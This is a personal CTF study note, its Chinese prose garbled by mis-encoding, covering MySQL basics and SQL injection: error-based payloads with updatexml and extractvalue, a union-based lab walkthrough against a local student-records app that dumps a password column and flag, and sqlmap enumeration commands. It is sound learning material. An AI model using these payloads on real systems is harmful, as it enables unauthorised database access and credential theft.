---
title: 20241212CTFå­¦ä¹ ç¬”è®°9
date: 2024-12-12
tags:
 - CTF
 - CTFLearn
categories:
   - å‘½ç†å­¦ Numerology
isShowComments: true
publish: true















---

<Boxx/>

ä»0å¼€å§‹å­¦ä¹ CTFï¼Œäº†è§£CTFåŸºæœ¬è§„åˆ™ã€æ–¹æ³•ï¼Œè¿™æ˜¯å¼€å§‹è§†é¢‘å­¦ä¹ çš„ç¬¬9å¤©

[[toc]]

- è§†é¢‘åœ°å€ã€[ä¼ é€é—¨](https://www.bilibili.com/video/BV1Lh411F7s8/)ã€‘

<!-- more -->

# ç¬¬9ç« ï¼šMySQLåŸºç¡€

## æ•°æ®åº“åŸºç¡€çŸ¥è¯†

RDBMSæ˜¯å…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ç®€ç§°

åº“->è¡¨->åˆ—->è¡Œ

SQLæ˜¯ç”¨äºè®¿é—®å’Œå¤„ç†æ•°æ®åº“çš„æ ‡å‡†è¯­è¨€ã€‚SQLçš„èŒƒå›´åŒ…æ‹¬æ•°æ®æ’å…¥ã€æŸ¥è¯¢ã€æ›´æ–°å’Œåˆ é™¤

1. æ˜¾ç¤ºæ•°æ®åº“ show databases;
2. æ‰“å¼€æ•°æ®åº“ use db_name;
3. æ˜¾ç¤ºæ•°æ®è¡¨ show tables;
4. æ˜¾ç¤ºè¡¨ç»“æ„ describe table_name;
5. æ˜¾ç¤ºè¡¨ä¸­å„å­—æ®µä¿¡æ¯ show colums from table_name;
6. æ˜¾ç¤ºè¡¨åˆ›å»ºè¿‡ç¨‹ show create table è¡¨å
7. åˆ—å‡ºå½“å‰mysql çš„çŠ¶æ€ä¿¡æ¯ status
8. åˆ é™¤æ•°æ®åº“ drop database åº“å
9. æ¸…ç©ºæ•°æ®è¡¨ delete from table_name;    truncate table from table_name;
10. åˆ é™¤æ•°æ®è¡¨ drop table table_name
11. æ•°æ®åº“è¿æ¥ mysql -uroot -p
12. æ•°æ®åº“é€€å‡º exit

## ä»€ä¹ˆæ˜¯SQLæ³¨å…¥

### å®šä¹‰ï¼š

SQLæ³¨å…¥æ˜¯ä¸€ç§å°†SQLä»£ç æ’å…¥æˆ–æ·»åŠ åˆ°åº”ç”¨çš„è¾“å…¥çš„å‚æ•°ä¸­çš„æ”»å‡»ï¼Œä¹‹åå†å°†è¿™äº›å‚æ•°ä¼ é€’ç»™åå°çš„SQLæœåŠ¡åŠ ä»¥è§£æå¹¶æ‰§è¡Œã€‚

å‡¡æ˜¯æ„é€ SQLè¯­å¥çš„æ­¥éª¤å‡å­˜åœ¨è¢«æ½œåœ¨æ”»å‡»çš„é£é™©ã€‚SQLæ³¨å…¥çš„ä¸»è¦æ–¹å¼æ˜¯ç›´æ¥å°†ä»£ç æ’å…¥å‚æ•°ä¸­ï¼Œè¿™äº›å‚æ•°ä¼šè¢«ç½®å…¥SQLå‘½ä»¤ä¸­åŠ ä»¥æ‰§è¡Œã€‚

æ”»å‡»è€…æŠŠSQLå‘½ä»¤è¯­å¥ä½œä¸ºè¾“å…¥è¢«æœåŠ¡å™¨SQLè§£é‡Šå™¨æ­£ç¡®æ‰§è¡Œè§£æï¼Œæ•°æ®åº“æŠŠæŸ¥è¯¢åˆ°çš„ç»“æœè¿”å›ç»™æœåŠ¡å™¨ï¼Œç„¶åå‘ˆç°ç»™æ”»å‡»è€…ï¼Œæ”»å‡»è€…ç”±æ­¤è·å¾—æ•°æ®åº“å†…çš„æ•°æ®ä¿¡æ¯

### é€šä¿—è§£é‡Šï¼š

ç”¨æˆ·æ§åˆ¶äº†SQLè¯­å¥çš„ä¸€éƒ¨åˆ†ï¼Œç”¨æˆ·çš„è¾“å…¥ä¸å†æ˜¯ä¸€ä¸ªè¾“å…¥å‚æ•°ï¼Œè€Œæˆä¸ºäº†ç¬¦åˆè¯­æ³•çš„SQLè¯­å¥

### ç±»å‹ï¼š

1. æŒ‰å›æ˜¾æ–¹å¼åˆ’åˆ†

| æœ‰å›æ˜¾   |                                      |
| -------- | ------------------------------------ |
| è”åˆæŸ¥è¯¢ | æ„é€ è”åˆæŸ¥è¯¢è¯­å¥ï¼Œç›´æ¥æŸ¥çœ‹æŸ¥è¯¢ç»“æœ   |
| æŠ¥é”™æ³¨å…¥ | æ„é€ æŠ¥é”™è¯­å¥ï¼Œåœ¨æŠ¥é”™ä¸­æŸ¥çœ‹ç»“æœ       |
| å †æŸ¥è¯¢   | å¤šè¡Œè¯­å¥æ‰§è¡Œï¼Œè¿›è€Œå®ç°æƒ³è¦è¾¾åˆ°çš„ç›®çš„ |

| æ— å›æ˜¾ |                                       |
| ------ | ------------------------------------- |
| ç›²æ³¨   | å¸ƒå°”å‹/æ—¶é—´å‹ï¼Œé€šè¿‡æŸç§æ‰‹æ®µâ€œçˆ†ç ´â€ç»“æœ |



# ç¬¬10ç« ï¼šæŠ¥é”™æ³¨å…¥

## æŠ¥é”™æ³¨å…¥åŸºç¡€

### å®šä¹‰ï¼š

æŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨äº†æ•°æ®åº“çš„æŸäº›æœºåˆ¶ï¼Œè®¤ä¸ºåˆ¶é€ é”™è¯¯æ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å‡ºç°åœ¨é”™è¯¯ä¿¡æ¯é‡Œ

### ä½¿ç”¨åœºæ™¯ï¼š

æŠ¥é”™æ³¨å…¥åœ¨ç”¨unionè”åˆæŸ¥è¯¢ä¸å¤ªå¥½ç”¨ï¼Œä¸èƒ½ç›´æ¥å¾—å‡ºç»“æœæ—¶ç”¨ï¼Œä½†å‰ææ—¶ä¸èƒ½è¿‡æ»¤ä¸€äº›å…³é”®çš„å‡½æ•°

æŠ¥é”™æ³¨å…¥å’Œè”åˆæ³¨å…¥éƒ½å±äºç‰¹åˆ«å…¥é—¨çº§çš„é¢˜ç›®

### ä¸¾ä¾‹ï¼š

```mysql

```

### XMLå’ŒXpathåŸºç¡€

ä»€ä¹ˆæ˜¯XMLï¼ŸXMLæŒ‡å¯æ‹“å±•æ ‡è®°è¯­è¨€ï¼Œç±»ä¼¼äºHTMLï¼Œè®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œéå®šä¹‰æ ‡ç­¾ã€‚XMLè¢«è®¾è®¡ä¸ºå…·æœ‰è‡ªæˆ‘æè¿°æ€§ï¼Œæ˜¯W3Cçš„æ¨èæ ‡å‡†ã€‚Xpathæ˜¯å¯¹xmlè¿›è¡Œå¯»å€ã€‚



### ğŸ“ updatexml()

ğŸ“**å®šä¹‰ï¼š**updatexmlæ˜¯ç”±äºå‚æ•°çš„æ ¼å¼ä¸æ­£ç¡®è€Œäº§ç”Ÿçš„é”™è¯¯âŒï¼ŒåŒæ ·ä¼šè¿”å›å‚æ•°ä¿¡æ¯ã€‚

ğŸ“**é€‚ç”¨ç‰ˆæœ¬ï¼š**MySQL5.1.5+

ğŸ“**å‡½æ•°è¯­æ³•ï¼š**

```
updatexml(XML_DOCUMENT, XPath_string, new value);
æˆ‘ä»¬é€šå¸¸åœ¨ç¬¬äºŒä¸ªXpath_stringå‚æ•°å¡«å†™æˆ‘ä»¬è¦æŸ¥è¯¢çš„å†…å®¹ã€‚
```

ğŸ“**payloadï¼š**updatexml(1,concat(0x7e,(select user()),0x7e),1)

ğŸ“**æ¼æ´åˆ©ç”¨åŸç†ï¼š**ç›®æ ‡æŸ¥è¯¢è¯­å¥çš„å‰åæ·»åŠ 	`~`	ä½¿å…¶ç¬¦åˆxpathæ ¼å¼æŠ¥é”™ï¼ŒæŠ¥é”™ä¿¡æ¯é‡Œæœ‰æˆ‘ä»¬æƒ³è¦çš„å†…å®¹

ğŸ“**è§£é‡Šï¼š**updatexml(1,concat(æ³¢æµªçº¿,(select user()),æ³¢æµªçº¿),1)ï¼Œæˆ‘ä»¬åªæ˜¯æƒ³è¦select user()çš„ç»“æœ

![image-20241212214851878](/img/ctfLearn/image-20241212214851878.png)

é€šè¿‡ä»¥ä¸Šç¤ºä¾‹ï¼Œæˆ‘ä»¬çœ‹åˆ°æŠ¥äº†errorçš„é”™ï¼Œé”™è¯¯ä¿¡æ¯æ˜¯`[HY000][1105] XPATH syntax error: '~root@localhost~'`ã€‚

åŒç†æˆ‘ä»¬å¯ä»¥å°†ç›®æ ‡æŸ¥è¯¢æ›¿æ¢ä¸º`select database()`æˆ–è€…`select group_concat(name) from users`ç­‰ã€‚



### ğŸ“ extractvalue()

ğŸ“**é€‚ç”¨ç‰ˆæœ¬ï¼š**MySQL5.1.5+

ğŸ“**å‡½æ•°è¯­æ³•ï¼š**EXTRACTVALUE(XML_DOCUMENT, Xpath_string);

ğŸ“**æ¼æ´åˆ©ç”¨åŸç†ï¼š**å’Œupdatexmlå‡½æ•°ç›¸åŒï¼ŒæŸ¥è¯¢å‰åæ·»åŠ æ³¢æµªçº¿è®©å…¶æŠ¥é”™

ğŸ“**payloadï¼š**extractvalue(1,concat(0x7e,(select user()),0x7e))

ğŸ“**å‡½æ•°è¯­æ³•ï¼š**extractvalue(1,concat(0x7e,(select user()),0x7e))

ğŸ“**è§£é‡Šï¼š**å¯¹æ¯”updatexmlå‡½æ•°ï¼Œåªæ˜¯ä¸éœ€è¦ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œ0x7eæ˜¯æ³¢æµªçº¿ï¼Œç”¨å®ƒç¡®ä¿æ³¢æµªçº¿ç»å¯¹ä¸æ˜¯xpathè¯­æ³•





### â“é¢˜ç›®ç»ƒä¹ 

è¿›å…¥é¶åœºï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªå­¦ç”Ÿä¿¡æ¯ç®¡ç†ç³»ç»Ÿï¼Œå¯ä»¥ç”¨HackBarä¼ å…¥ä¸€ä¸ªå¸¦å•å¼•å·çš„å‚æ•°è¯•ä¸€ä¸‹

![image-20241212221324509](/img/ctfLearn/image-20241212221324509.png)	

ç›´æ¥è¿”å›äº†æ•°æ®åº“çš„æŠ¥é”™ä¿¡æ¯âŒâŒâŒï¼ˆç°å®ç¯å¢ƒä¸­æ€ä¹ˆå¯èƒ½ä¼šè¾“å‡ºæ•°æ®åº“çš„æŠ¥é”™ä¿¡æ¯ï¼‰

```
You have an eror in your SqL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near "2019122001" at line 1 
```

æˆ‘ä»¬å°è¯•é‡æ–°è¾“å…¥è¯·æ±‚ï¼Œå‘ç°å¯ä»¥æ­£å¸¸æŸ¥è¯¢å‡ºç»“æœï¼Œå’Œåˆšæ‰å›¾ç‰‡ä¸­çš„ç»“æœç›¸åŒ

```
http://127.0.0.1:8000/?student_id=2019122001' or '1' = '1
```

åŒç†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸ç”¨å­—ç¬¦å‹çš„ï¼Œç”¨æ•°å­—å‹çš„whereæ¡ä»¶ï¼Œä½†æ˜¯è¦æ³¨æ„è¦æŠŠ`#`è¿›è¡ŒURLç¼–ç å¾—åˆ°`%23`

```
http://127.0.0.1:8000/?student_id=2019122001' or 1 = 1%23
```

> åœ¨è¿›è¡ŒURLç¼–ç æ—¶ï¼Œæ„Ÿè§‰çº¿ä¸Šå·¥å…·çš„é™åˆ¶å¤ªå¤§äº†ï¼Œæœªæ¥å¯èƒ½ä¼šåœ¨å†…ç½‘æ¯”èµ›ï¼Œéœ€è¦ä¸€ä¸ªç¦»çº¿çš„å·¥å…·ï¼Œç¿»çœ‹äº†hello-ctfçš„å·¥å…·åˆ—è¡¨ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªåˆé€‚çš„å·¥å…·ï¼š
>
> | é¡¹ç›®åç§°  | Usage                    | é¡¹ç›®åœ°å€                                                     | æ–‡æ¡£ |
> | :-------- | :----------------------- | :----------------------------------------------------------- | :--- |
> | CyberChef | è¿‘ä¹å…¨èƒ½çš„ç¼–ç è§£ç å·¥å…·ã€‚ | [å®˜ç½‘](https://cyberchef.org/) [å›½å†…ä¸­æ–‡é•œåƒç«™](https://ctf.mzy0.com/CyberChef3/) | /    |

ä¹‹åæˆ‘ä»¬å°è¯•order byæ¥æ‰¾åˆ°è¿™å¼ è¡¨æœ‰å‡ ä¸ªå­—æ®µï¼Œç”¨1ã€2ã€3ä»¥æ­¤ç±»æ¨ï¼Œå½“order by 4çš„æ—¶å€™æŠ¥é”™äº†ï¼Œæ‰€ä»¥æœ‰3åˆ—

```
http://127.0.0.1:8000/?student_id=2019122001' order by 1ã€2ã€3
```

ä¸‹ä¸€æ­¥æˆ‘ä»¬è¿›è¡Œunionçš„è”åˆæŸ¥è¯¢ï¼Œç†æƒ³ç»“æœæ˜¯1ï¼Œ2ï¼Œ3éƒ½å±•ç¤ºåœ¨åˆ—è¡¨é‡Œ

```
http://127.0.0.1:8000/?student_id=2019122001' union select 1,2,3%23
```

ä¸Šè¾¹çš„è¯·æ±‚ç»“æœå‘ç°è¿˜æ˜¯2019122001ã€Tomã€information Securityã€‚æ­¤æ—¶æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹è¯·æ±‚

```
http://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select 1,2,3%23
```

è¿™æ¬¡å›æ˜¾äº†1ï¼Œ2ï¼Œ3ã€‚è¿™æ„å‘³ç€ä¸‰åˆ—éƒ½å¯ä»¥å›æ˜¾ï¼Œæ¥ä¸‹æ¥çš„æ­¥éª¤æ˜¯æŸ¥è¡¨ã€æŸ¥å­—æ®µã€æŸ¥æ•°æ®ç­‰

å› ä¸ºæˆ‘ä»¬çŸ¥é“äº†åŸç†ï¼Œä¸‹è¾¹æˆ‘ä»¬ç›´æ¥ç”¨å·¥å…·HackBaræ³¨å…¥

![image-20241212224459125](/img/ctfLearn/image-20241212224459125.png)

å›¾ä¸­æ˜¯æŸ¥è¡¨ï¼Œå…¶å®å¯ä»¥å…ˆä»æŸ¥åº“åå¼€å§‹ï¼Œç‚¹å‡»ä»¥åå‡ºç°ä»¥ä¸‹é¡µé¢ï¼Œéœ€è¦è¾“å…¥å‚æ•°

![image-20241212225353226](/img/ctfLearn/image-20241212225353226.png)

`The number of columns`è¿™ä¸ªå‚æ•°éœ€è¦å¡«æˆ‘ä»¬æœ‰å‡ ä¸ªåˆ—ï¼Œåˆšæ‰ç”¨order byæ‰¾åˆ°æ˜¯æœ‰3ä¸ªå­—æ®µï¼Œ3åˆ—

`Output position`è¿™ä¸ªå‚æ•°æ˜¯åˆšåˆšçœ‹çš„123ç¬¬å‡ ä¸ªè¢«å›æ˜¾äº†ï¼Œè€Œæˆ‘ä»¬æ˜¯3ä¸ªéƒ½å›æ˜¾äº†ï¼Œæ‰€ä»¥123ä»»æ„ä¸€ä¸ªéƒ½å¯ä»¥

![image-20241212230451691](/img/ctfLearn/image-20241212230451691.png)

ä»¥ä¸Šå°±æ˜¯æ‰€æœ‰çš„æ•°æ®åº“ï¼ŒåŒç†æˆ‘ä»¬å¯ä»¥ç”¨`select database()`æ¥æŸ¥å½“å‰æ•°æ®åº“

```
http://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select database(),2,3%23
```



åŒç†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æŸ¥è¡¨åï¼Œç”¨`SQLI -> MySQL -> Dump tables from database`

```
http://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select group_concat(table_name),2,3 from information_schema tables where table_schema=database()%23
```

æŸ¥åˆ°çš„ç»“æœæ˜¯`student,teacher`ã€2ã€3



åŒç†æˆ‘ä»¬æŸ¥åˆ—ï¼Œç”¨`SQLI -> MySQL -> Dump columns from database`

```
http://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select group_concat(column_name),2,3 from information_schema.columns where table_schema=database()%23
```

æŸ¥åˆ°çš„ç»“æœæ˜¯`id,name,majority,id,name,card_passwd,age`ï¼Œè¿™æ˜¯è¿™ä¸¤å¼ è¡¨æ‰€æœ‰çš„åˆ—ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¸çŸ¥é“å“ªä¸ªåˆ—å¯¹åº”å“ªä¸ªè¡¨ï¼Œæˆ‘ä»¬å†åŠ ä¸€ä¸ªæ¡ä»¶

```
http://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select group_concat(column_name),2,3 from information_schema.columns where table_schema=database() and table_name='teacher'%23
```



æœ‰äº†è¡¨å’Œåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥æ•°æ®äº†

```
http://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select group_concat(id),group_concat(name,age),group_concat(card_passwd) from teacher%23
```

ç»“æœæ˜¯

| å­¦å·              | å§“å                          | ä¸“ä¸š                                     |
| ----------------- | ----------------------------- | ---------------------------------------- |
| 78820,91723,88915 | Terry43,Fry34,Steve36,Tomia45 | 829012,114514,234231,flag{SQL_Inj3ct10n} |



### ä½¿ç”¨extractvalue()å‡½æ•°å®Œæˆä¾‹é¢˜

æˆ‘ä»¬ç”¨extractvalueå‡½æ•°æ‹¼æ¥å‡ºä»¥ä¸‹è¯·æ±‚

```
http://127.0.0.1:8000/?student_id=1%27 and extractvalue(1,concat(0x0a,(select group_concat(card_passwd)from teacher)))%23
```

å¾—åˆ°äº†å¦‚ä¸‹æŠ¥é”™ä¿¡æ¯ï¼Œå‘ç°æŠ¥é”™ä¿¡æ¯å¤ªé•¿äº†ï¼Œéƒ¨åˆ†å†…å®¹ä¸æ˜¾ç¤ºäº†

```
XPATH syntax error:'829012,114514,234231,fag{SQL_1'
```

æˆ‘ä»¬ä¼˜åŒ–ä¸€ä¸‹è¯·æ±‚ï¼Œä»å20ä½å¼€å§‹æˆªå–

```
http://127.0.0.1:8000/?student_id=1%27 and extractvalue(1,concat(0x0a,(select substr((select group_concat(card_passwd)from teacher),20))))%23
```

å¾—åˆ°äº†å¦‚ä¸‹æŠ¥é”™ä¿¡æ¯ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥å­¦åˆ°ï¼Œå¦‚æœé•¿åº¦ä¸å¤Ÿï¼Œå¯ä»¥å°è¯•æˆªå–ï¼Œ

```
r:'234231,flag{SQL_Inj3ct10n}
```



### ä½¿ç”¨sqlMapå®Œæˆä¾‹é¢˜

```shell
# è·‘æ•°æ®åº“
sqlmap -u http://127.0.0.1:8000/\?student id\=2019122001 --dbs
# ç°åœ¨ä½¿ç”¨çš„æ•°æ®åº“
sqlmap -u http://127.0.0.1:8000/\?student id\=2019122001 --current-db
# -Dæ˜¯æŒ‡å®šåº“å -tablesæ˜¯æŸ¥æ‰€æœ‰è¡¨
sqlmap -u http://127.0.0.1:8000/\?student id\=2019122001 --D college -tables
# -T æ˜¯æŒ‡å®šè¡¨å --columnsæ˜¯æ‰€æœ‰åˆ—
sqlmap -u http://127.0.0.1:8000/\?student id\=2019122001 --D college -T teacher --columns
# --dumpæ˜¯å°†è¡¨ä¸­æ‰€æœ‰ä¿¡æ¯dumpå‡ºæ¥
sqlmap -u http://127.0.0.1:8000/\?student id\=2019122001 --D college -T teacher --dump
```

